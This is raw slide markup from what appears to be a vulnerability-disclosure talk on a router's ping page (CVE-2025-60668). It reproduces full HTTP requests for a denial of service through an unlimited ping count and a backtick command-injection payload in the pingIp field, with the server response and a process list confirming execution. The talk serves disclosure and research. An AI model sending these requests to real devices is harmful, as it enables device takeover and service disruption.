          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="207525" y="660700"/>
            <a:ext cx="4034400" cy="36864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Never say never</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>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Never say always</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>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These are always vulnerable</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-342900" lvl="0" marL="457200" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1800"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Main Page -&gt; Setup -&gt; Ping</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>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What does a request look like?</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>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Removed from the latest firmware</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="298" name="Google Shape;298;p37"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4241925" y="234075"/>
            <a:ext cx="3075050" cy="4294876"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Google Shape;299;p37"/>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8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="67100" y="751175"/>
            <a:ext cx="8832300" cy="37560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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>POST /cgi-bin/adm.cgi HTTP/1.1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Host: 127.0.0.1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Content-Length: 38</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Cache-Control: max-age=0</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sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"</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sec-ch-ua-mobile: ?0</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sec-ch-ua-platform: "Linux"</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Accept-Language: en-US,en;q=0.9</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Origin: http://127.0.0.1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Content-Type: application/x-www-form-urlencoded</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Upgrade-Insecure-Requests: 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User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</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Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</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Sec-Fetch-Site: same-origin</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Sec-Fetch-Mode: navigate</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Sec-Fetch-User: ?1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Sec-Fetch-Dest: iframe</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Referer: http://127.0.0.1/ping.shtml?r=66037</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Accept-Encoding: gzip, deflate, br</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Cookie: session=1973184444</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Connection: keep-alive</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <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page=ping_test&amp;CCMD=5&amp;pingIp=127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="305" name="Google Shape;305;p38"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="121225" y="134225"/>
            <a:ext cx="8659200" cy="5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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Always ask yourself, "What can I control?"</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-7930709">
            <a:off x="1608072" y="3918885"/>
            <a:ext cx="133593" cy="238732"/>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7" name="Google Shape;307;p38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-7930709">
            <a:off x="2792872" y="3918885"/>
            <a:ext cx="133593" cy="238732"/>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8" name="Google Shape;308;p38"/>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9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132050" y="145050"/>
            <a:ext cx="87999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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Crashing the router…</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="314" name="Google Shape;314;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="591050" y="796200"/>
            <a:ext cx="7881900" cy="2165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Edit the CCMD= parameter, we can control the amount of pings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9999?</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0? (means ping forever)</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No limit on how many requests you can send</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One request == one ping process</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>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
        <p:nvSpPr>
          <p:cNvPr id="315" name="Google Shape;315;p39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132050" y="2308325"/>
            <a:ext cx="8799900" cy="23076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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>--snip--</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9416 rootws    5712 S    /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf</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27431 rootws       0 SW   [flush-0:13]</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29076 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi</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29080 rootws    1296 S    ping 127.0.0.1 -W 1 -c 9999</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--snip--</a:t>
            </a:r>
            <a:endParaRPr sz="1500">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="316" name="Google Shape;316;p39"/>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0" name="Shape 320"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="321" name="Google Shape;321;p40"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="3904500" cy="4848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sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Ping 9999</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="322" name="Google Shape;322;p40" title="ping999.mkv">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="653150"/>
            <a:ext cx="8479973" cy="4022825"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="323" name="Google Shape;323;p40"/>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1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="3904500" cy="4848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sz="3000">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Ping forever</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="3000">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="329" name="Google Shape;329;p41" title="ping0.mkv">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="675300"/>
            <a:ext cx="8557224" cy="4000674"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="330" name="Google Shape;330;p41"/>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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="261950" y="123400"/>
            <a:ext cx="8594100" cy="70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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>We can do better than this!</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="336" name="Google Shape;336;p42"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="164525" y="816125"/>
            <a:ext cx="8821500" cy="36801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Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>POST /cgi-bin/adm.cgi HTTP/1.1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Host: 127.0.0.1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Content-Length: 54</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Cache-Control: max-age=0</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sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"</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sec-ch-ua-mobile: ?0</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sec-ch-ua-platform: "Linux"</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Accept-Language: en-US,en;q=0.9</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Origin: http://127.0.0.1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Content-Type: application/x-www-form-urlencoded</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Upgrade-Insecure-Requests: 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User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</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Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</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Sec-Fetch-Site: same-origin</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Sec-Fetch-Mode: navigate</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Sec-Fetch-User: ?1</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Sec-Fetch-Dest: iframe</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Referer: http://127.0.0.1/ping.shtml?r=47439</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Accept-Encoding: gzip, deflate, br</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Cookie: session=1920444770</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Connection: keep-alive</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="900">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="900">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>page=ping_test&amp;CCMD=5&amp;pingIp=127.0.0.1`ls&gt;/tmp/ls.out`</a:t>
            </a:r>
            <a:endParaRPr sz="900">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="337" name="Google Shape;337;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3989075" y="4178725"/>
            <a:ext cx="294900" cy="1755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42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2090725" y="3776300"/>
            <a:ext cx="294900" cy="1755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9" name="Google Shape;339;p42"/>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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="150450" y="783650"/>
            <a:ext cx="8843100" cy="38208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Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>HTTP/1.1 200 OK</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Content-Length: 35</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Date: Mon, 11 Aug 2025 19:44:13 GMT</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Server: lighttpd</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <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pingIp = 127.0.0.1`ls&gt;/tmp/ls.out`</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a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <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21330 rootws    1224 S    /etc/lighttpd/www/cgi-bin/adm.cgi</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21333 rootws    1296 S    sh -c ping "127.0.0.1`ls&gt;/tmp/ls.out`" -W 1 -c 5 &gt; /</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:latin typeface="Roboto Mono"/>
                <a:ea typeface="Roboto Mono"/>
                <a:cs typeface="Roboto Mono"/>
                <a:sym typeface="Roboto Mono"/>
              </a:rPr>
              <a:t>21334 rootws    1296 R    ps</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Roboto Mono"/>
              <a:ea typeface="Roboto Mono"/>
              <a:cs typeface="Roboto Mono"/>
              <a:sym typeface="Roboto Mono"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;p43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="207825" y="145050"/>
            <a:ext cx="8702400" cy="51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Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>CVE-2025-60668: Successful Injection response, and Process list</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="346" name="Google Shape;346;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6447150" y="1341400"/>
            <a:ext cx="1882200" cy="519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43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6520950" y="1397500"/>
            <a:ext cx="1734600" cy="4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rPr>
              <a:t>Response</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="348" name="Google Shape;348;p43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6531425" y="3600700"/>
            <a:ext cx="1882200" cy="519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43"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6605225" y="3656800"/>
            <a:ext cx="1734600" cy="4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rPr>
              <a:t>Process List</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="350" name="Google Shape;350;p43"/>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4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8348400" cy="4455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sz="2700">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Exploit and Look Around</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2700">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="356" name="Google Shape;356;p44" title="survey-exploit.mkv">
            <a:hlinkClick r:id="rId3"/>
          </p:cNvPr>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="611250"/>
            <a:ext cx="8578301" cy="4038001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="357" name="Google Shape;357;p44"/>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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3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5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="8472000" cy="4587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sz="2800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>But wait, </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>there's</a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="2800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t> more…</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="2800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="363" name="Google Shape;363;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="196250" y="801375"/>
            <a:ext cx="3521100" cy="37044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Font typeface="Urbanist Medium"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1800">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist Medium"/>
                <a:ea typeface="Urbanist Medium"/>
                <a:cs typeface="Urbanist Medium"/>
                <a:sym typeface="Urbanist Medium"/>
              </a:rPr>
              <a:t>No free form input</a:t>
            </a:r>
